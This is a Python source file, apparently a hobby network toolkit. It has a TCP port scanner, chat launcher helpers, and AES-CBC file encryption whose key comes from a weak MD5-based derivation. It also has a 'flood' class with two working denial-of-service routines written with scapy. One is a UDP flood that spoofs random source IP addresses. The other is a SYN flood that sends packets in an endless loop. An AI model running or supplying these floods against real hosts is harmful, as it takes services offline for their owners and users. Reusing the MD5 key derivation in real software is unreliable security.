import socket
import sys
from datetime import datetime
import subprocess
import os
from hashlib import md5
from Cryptodome.Cipher import AES
from os import urandom
from scapy.all import IP, TCP, UDP, RandShort, Raw, send, RandIP


class Portscan:

    def singlePortScan(self, ip, r1, r2):

        print("\nScanner is working on ", ip)
        t1 = datetime.now()
        try:
            for port in range(r1, r2):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    print("Port Open:\t", port)
                sock.close()
        except KeyboardInterrupt:
            print("You stopped this")
            sys.exit()
        except socket.gaierror:
            print("Hostname could not be resolved")
            sys.exit()
        except socket.error:
            print("Could not connect to server")
            sys.exit()
        t2 = datetime.now()
        total = t2 - t1
        print("Scanning complete in ", total)

    # PortScan from multiple IP Addresses 
    def multiplePortScan(self, ipList, r1, r2):
        i = 0
        print(ipList)
        t1 = datetime.now()
        try:
            for x in ipList:
                print("\nScanner is working on ", ipList[i])
                
                for port in range(r1, r2):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    socket.setdefaulttimeout(1)
                    result = sock.connect_ex((ipList[i], port))
                    print("Testing Port", port)
                    if result == 0:
                        print("Port Open:\t", port)
                    sock.close()
                i = i + 1

        except KeyboardInterrupt:
            print("You stopped this")
            sys.exit()
        except socket.gaierror:
            print("Hostname could not be resolved")
            sys.exit()
        except socket.error:
            print("Could not connect to server")
            sys.exit()
        t2 = datetime.now()
        total = t2 - t1
        print("\nScanning complete in ", total)        
        input()
        
    # PortScan from a Range of IP Addresses   

class flood:
    
    def udpFlood(self, dst_ip, dst_port):

        # Define the data to send in the UDP packet
        data = "Hello, world!"

        while True:
            src_ip = RandIP()
            udp_packet = IP(src=src_ip, dst=dst_ip) / UDP(sport=RandShort(), dport=dst_port) / Raw(load=data)
            send(udp_packet)

    def synFlood(self, target_ip, target_port):
        
        ip = IP(dst=target_ip)
        tcp = TCP(sport=RandShort(), dport = target_port, flags = "S")

        raw = Raw(b"X"*1024)

        p = ip / tcp / raw

        send(p, loop = 1, verbose = 1)



class IM:

    def server(self):
        print("Server started")
        subprocess.call('start cmd /k python scripts/server.py', shell=True)

    def client(self):
        print("New Client Launched")
        subprocess.call('start cmd /k python scripts/client.py', shell=True)

class files:
    
    def listFiles(self):
        # Get the current working directory
        cwd = os.getcwd()

        # List all files in the directory
        files = os.listdir(cwd + "/logs/")

        # Print the list of files
        for file in files:
            print(file)


    def derive_key_and_iv(self, password, salt, key_length, iv_length): #derive key and IV from password and salt.
        d = d_i = b''
        while len(d) < key_length + iv_length:
            d_i = md5(d_i + str.encode(password) + salt).digest() #obtain the md5 hash value
            d += d_i
        return d[:key_length], d[key_length:key_length+iv_length]

    def encrypt(self, in_file, out_file, password, key_length=32):
        bs = AES.block_size #16 bytes
        salt = urandom(bs) #return a string of random bytes
        key, iv = self.derive_key_and_iv(password, salt, key_length, bs)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        out_file.write(salt)
        finished = False

        while not finished:
            chunk = in_file.read(1024 * bs) 
            if len(chunk) == 0 or len(chunk) % bs != 0:#final block/chunk is padded before encryption
                padding_length = (bs - len(chunk) % bs) or bs
                chunk += str.encode(padding_length * chr(padding_length))
                finished = True
            out_file.write(cipher.encrypt(chunk))

    def decrypt(self, in_file, out_file, password, key_length=32):
        bs = AES.block_size
        salt = in_file.read(bs)
        key, iv = self.derive_key_and_iv(password, salt, key_length, bs)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        next_chunk = ''
        finished = False
        while not finished:
            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))
            if len(next_chunk) == 0:
                padding_length = chunk[-1]
                chunk = chunk[:-padding_length]
                finished = True 
            out_file.write(bytes(x for x in chunk)) 



    




    
